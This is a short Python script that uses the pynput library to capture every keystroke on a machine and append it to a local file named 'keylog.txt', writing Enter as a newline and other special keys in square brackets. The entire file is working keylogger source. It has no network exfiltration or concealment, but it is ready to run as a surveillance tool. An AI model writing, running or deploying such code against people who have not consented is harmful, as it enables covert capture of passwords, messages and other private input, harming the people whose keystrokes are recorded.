from pynput import keyboard

# File to save keystrokes
log_file = "keylog.txt"

# Function to write the keystrokes to a file
def write_to_file(key):
    with open(log_file, "a") as f:
        try:
            # Write the actual character if it's not a special key (like Shift or Enter)
            f.write(key.char)
        except AttributeError:
            # Handle special keys (like Enter, Backspace, etc.)
            if key == keyboard.Key.space:
                f.write(' ')  # Replace space key with a space
            elif key == keyboard.Key.enter:
                f.write('\n')  # Replace enter key with a newline
            else:
                f.write(f'[{key.name}]')  # Write special keys in square brackets

# Function to capture key presses
def on_press(key):
    write_to_file(key)

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
